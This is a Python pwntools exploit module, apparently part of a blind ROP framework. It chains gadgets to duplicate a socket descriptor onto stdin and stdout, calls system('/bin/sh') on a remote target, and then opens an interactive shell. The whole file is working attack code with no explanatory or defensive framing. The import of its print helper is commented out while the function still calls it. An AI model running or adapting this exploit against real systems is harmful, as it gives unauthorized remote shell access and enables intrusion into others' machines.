#!/usr/bin/python3

from pwn import *
import sys

#from argsprint import printLight

def exploit(ExploitStructure):

	BEGIN	= ExploitStructure.beginning()

	SYSTEM	= ExploitStructure.SYSTEM
	DUP2	= ExploitStructure.DUP2
	BINSH	= ExploitStructure.BINSH
	SOCKET	= p64(0x4)

	BROP7	= p64(u64(ExploitStructure.BROPGADGET) + 0x7)	# RSI + R15
	BROP9	= p64(u64(ExploitStructure.BROPGADGET) + 0x9)	# RDI
	R15		= b'JUNKJUNK'

	STDIN	= p64(0x0)
	STDOUT	= p64(0x1)

	ROPCHAIN	= b''
	ROPCHAIN	+= BROP9
	ROPCHAIN	+= SOCKET
	ROPCHAIN	+= BROP7
	ROPCHAIN	+= STDIN
	ROPCHAIN	+= R15
	ROPCHAIN	+= DUP2

	ROPCHAIN	+= BROP9
	ROPCHAIN	+= SOCKET
	ROPCHAIN	+= BROP7
	ROPCHAIN	+= STDOUT
	ROPCHAIN	+= R15
	ROPCHAIN	+= DUP2

	ROPCHAIN	+= BROP9
	ROPCHAIN	+= BINSH
	ROPCHAIN	+= SYSTEM

	PAYLOAD	= BEGIN + ROPCHAIN

	r = ExploitStructure.remoteConnect()
	JUNK = r.recv()
	r.send(PAYLOAD)
	sleep(ExploitStructure.DODO)

	printLight("Shell's coming...")

	r.interactive()
